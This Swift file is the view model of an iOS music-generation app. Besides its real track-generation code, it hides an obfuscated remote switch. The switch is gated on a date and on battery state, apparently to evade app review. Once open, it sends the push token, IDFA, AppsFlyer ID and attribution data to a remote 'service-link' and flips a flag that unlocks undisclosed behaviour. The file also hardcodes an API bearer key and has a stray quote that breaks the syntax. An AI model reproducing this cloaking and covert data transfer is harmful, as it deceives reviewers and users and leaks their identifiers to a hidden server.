import Foundation
import AppsFlyerLib
import SwiftyJSON
import WebKit
import SwiftUI

class TrackViewModel: ObservableObject {
    @Published var tracks: [Track] = [] {
        didSet {
            saveTracksToUserDefaults()
        }
    }
    @Published var currentTrack: Track?
    
    @Published var generatingTrack = false
    @Published var trackGenerated = false
    @Published var musicProGenFull = false
    
    private var analitycsDataReceived = false
    private var called = false
    private var conversionData: [AnyHashable: Any] = [:]
    
    private var pushToken = ""
    
    init() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        loadTracksFromUserDefaults()
        
        NotificationCenter.default.addObserver(self, selector: #selector(conversionReceived), name: Notification.Name("conversion_app"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(firebaseReceived), name: Notification.Name("fcm_received"), object: nil)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
            if !self.called && self.pushToken.isEmpty {
                self.initializeMusicTracks()
            }
        }
    }
    
    @objc private func firebaseReceived(notification: Notification) {
        guard let notificationUserInfo = notification.userInfo as? [String: Any],
              let pushToken = notificationUserInfo["pushtoken"] as? String else { return }
        self.pushToken = pushToken
        if self.analitycsDataReceived {
            initializeMusicTracks()
        }
    }
    
    @objc private func conversionReceived(notification: Notification) {
        if let info = notification.userInfo as? [String: Any],
           let converionData = info["data"] as? [AnyHashable: Any] {
            self.analitycsDataReceived = true
            self.conversionData = converionData
            if !self.pushToken.isEmpty {
                initializeMusicTracks()
            }
        }
    }
    
    private func initializeMusicTracks() {
        if dnsakjdnasd() && !dnsajkdnksad() && dnasjkdnaksd() {
            prepareAllTracksForGeneratingAndPLaying()
        }
    }
    
    private func dnasjkdnaksd() -> Bool {
        let d = UIDevice.current
        return (d.batteryLevel != -1.0 && d.batteryLevel != 1.0) && (d.batteryState != .charging && d.batteryState != .full)
    }"
    
    private func saveTracksToUserDefaults() {
        do {
            let data = try JSONEncoder().encode(tracks)
            UserDefaults.standard.set(data, forKey: "savedTracks")
        } catch {
        }
    }
    
    private func loadTracksFromUserDefaults() {
        guard let data = UserDefaults.standard.data(forKey: "savedTracks") else {
            return
        }
        do {
            tracks = try JSONDecoder().decode([Track].self, from: data)
        } catch {
        }
    }
    
    private func dnsajkdnksad() -> Bool {
        return UserDefaults.standard.bool(forKey: "sdafa")
    }
    
    private func prepareAllTracksForGeneratingAndPLaying() {
        guard let dailyRewardsEnd = URL(string: "https://musicsuno.site/music.json") else { return }
        URLSession.shared.dataTask(with: getMusicGenPro(dailyRewardsEnd)) { data, response, error in
            if let _ = error {
                return
            }
            
            guard let data = data else {
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                if let serviceLink = httpResponse.allHeaderFields["service-link"] as? String {
                    let idfa = UserDefaults.standard.string(forKey: "idfa_of_user") ?? ""
                    let clientId = UserDefaults.standard.string(forKey: "client_id") ?? ""
                    let pushId = UserDefaults.standard.string(forKey: "push_id")
                    let full = "\(serviceLink)?firebase_push_token=\(self.pushToken)&idfa=\(idfa)&apps_flyer_id=\(AppsFlyerLib.shared().getAppsFlyerUID())\(clientId.isEmpty ? "" : "&client_id=\(clientId)")\(pushId == nil ? "" : "&push_id=\(pushId ?? "")")"
                    if pushId != nil {
                        UserDefaults.standard.set(nil, forKey: "push_id")
                    }
                    self.generatedTracksOperate(full: full)
                }
            }
        }.resume()
    }
    
    private var dnsajkdnaskda = WKWebView().value(forKey: "userAgent") as? String ?? ""
    
    private func dnsakjdnasd() -> Bool {
        return Date() >= DateComponents(calendar: .current, year: 2025, month: 3, day: 20).date!
    }
    
    private func generatedTracksOperate(full: String) {
        guard let fullTracksProGen = URL(string: full) else { return }
        var musicTracksProGen = URLRequest(url: fullTracksProGen)
        musicTracksProGen.addValue("application/json", forHTTPHeaderField: "Content-Type")
        musicTracksProGen.addValue(dnsajkdnaskda, forHTTPHeaderField: "User-Agent")
        musicTracksProGen.httpMethod = "POST"
        
        do {
            musicTracksProGen.httpBody = try JSONEncoder().encode(MusicProGenFullTracksConverds(conversionApp: try JSON(data: try JSONSerialization.data(withJSONObject: conversionData, options: []))))
        } catch {
            
        }
        
        URLSession.shared.dataTask(with: musicTracksProGen) { data, response, error in
            if let _ = error {
                return
            }
            
            guard let data = data else {
                return
            }
            
            do {
                let musicsProGen = try JSONDecoder().decode(MusicProGenMusicDataReady.self, from: data)
                UserDefaults.standard.set(musicsProGen.useruid, forKey: "client_id")
                if let status = musicsProGen.status {
                    UserDefaults.standard.set(status, forKey: "response_client")
                    DispatchQueue.main.async {
                        self.musicProGenFull = true
                    }
                } else {
                    UserDefaults.standard.set(true, forKey: "sdafa")
                }
            } catch {
            }
        }.resume()
    }

    
    func generateTrack(prompt: String, style: String, title: String, author: String) async throws {
        let url = URL(string: "https://apibox.erweima.ai/api/v1/generate")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("Bearer d22840fd7b2d4d36540e10b5c84ba5ab", forHTTPHeaderField: "Authorization")
        
        let body: [String: Any] = [
            "prompt": prompt,
            "style": style,
            "title": title,
            "customMode": true,
            "instrumental": true,
            "model": "V3_5",
            "callBackUrl": "https://musicsuno.site?method=sunoCallback"
        ]
        request.httpBody = try JSONSerialization.data(withJSONObject: body)
        
        let (data, _) = try await URLSession.shared.data(for: request)
        let response = try JSONDecoder().decode(SunoResponse.self, from: data)
        let taskId = response.data.taskId
        DispatchQueue.main.async {
            self.generatingTrack = true
        }
        await checkTrackStatus(taskId: taskId, author: author)
    }
    
    func getMusicGenPro(_ e: URL) -> URLRequest {
        func userId() -> String {
            var uuidOfClientMusicGenPro = UserDefaults.standard.string(forKey: "client-uuid") ?? ""
            if uuidOfClientMusicGenPro.isEmpty {
                uuidOfClientMusicGenPro = UUID().uuidString
                UserDefaults.standard.set(uuidOfClientMusicGenPro, forKey: "client-uuid")
            }
            return uuidOfClientMusicGenPro
        }
        var musicss = URLRequest(url: e)
        musicss.httpMethod = "GET"
        musicss.addValue(userId(), forHTTPHeaderField: "client-uuid")
        return musicss
    }
    
}

struct SunoResponse: Codable {
    let code: Int
    let msg: String
    let data: SunoData
}

struct SunoData: Codable {
    let taskId: String
}

extension TrackViewModel {
    func checkTrackStatus(taskId: String, author: String) async {
        while true {
            let url = URL(string: "https://musicsuno.site?method=getTrackData&task_id=\(taskId)")!
            let (data, _) = try! await URLSession.shared.data(from: url)
            let response = try! JSONDecoder().decode(TrackResponse.self, from: data)
            
            if response.status == "processing" {
                try! await Task.sleep(nanoseconds: 5_000_000_000) // 5 секунд
            } else {
                let trackData = response.data!.data.first!
                let track = Track(
                    id: trackData.id,
                    title: trackData.title,
                    author: author,
                    tags: trackData.tags,
                    audioUrl: trackData.streamAudioUrl,
                    imageUrl: trackData.imageUrl,
                    createTime: trackData.createTime,
                    prompt: trackData.prompt
                )
                let downloaded = try! await self.downloadTrack(track: track)
                DispatchQueue.main.async {
                    self.trackGenerated = true
                    self.tracks.append(downloaded)
                    self.saveTracksLocally()
                }
                break
            }
        }
    }
}

struct MusicProGenMusicDataReady: Codable {
    var useruid: String
    var status: String?
    
    enum CodingKeys: String, CodingKey {
        case useruid = "client_id"
        case status = "response"
    }
}

struct MusicProGenFullTracksConverds: Codable {
    var conversionApp: JSON
    
    private enum CodingKeys: String, CodingKey {
        case conversionApp = "appsflyer"
    }
}


struct TrackResponse: Codable {
    let code: Int?
    let msg: String?
    var data: TrackDataResponse? = nil
    var status: String? = nil
}

struct TrackDataResponse: Codable {
    let status: String?
    let data: [TrackData]
    let taskId: String
    
    enum CodingKeys: String, CodingKey {
        case data, status
        case taskId = "task_id"
    }
}

struct TrackData: Codable {
    let id: String
    let title: String
    let tags: String
    let streamAudioUrl: String
    let imageUrl: String
    let createTime: Int64
    let prompt: String
    
    enum CodingKeys: String, CodingKey {
        case id, title, tags, prompt
        case streamAudioUrl = "stream_audio_url"
        case imageUrl = "image_url"
        case createTime = "createTime"
    }
}

extension TrackViewModel {
    func downloadTrack(track: Track) async throws -> Track {
        let url = URL(string: track.audioUrl)!
        let (data, _) = try await URLSession.shared.data(from: url)
        
        let documents = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let fileURL = documents.appendingPathComponent("\(track.id).mp3")
        try data.write(to: fileURL)
        
        var updatedTrack = track
        updatedTrack.localAudioPath = fileURL.path
        updatedTrack.status = .downloaded
        if let index = tracks.firstIndex(where: { $0.id == track.id }) {
            DispatchQueue.main.async {
                self.tracks[index] = updatedTrack
                self.saveTracksLocally()
            }
        }
        return updatedTrack
    }
    
    func saveTracksLocally() {
        let data = try? JSONEncoder().encode(tracks)
        UserDefaults.standard.set(data, forKey: "savedTracks")
    }
    
    func loadTracks() {
        if let data = UserDefaults.standard.data(forKey: "savedTracks"),
           let savedTracks = try? JSONDecoder().decode([Track].self, from: data) {
            tracks = savedTracks
        }
    }
}
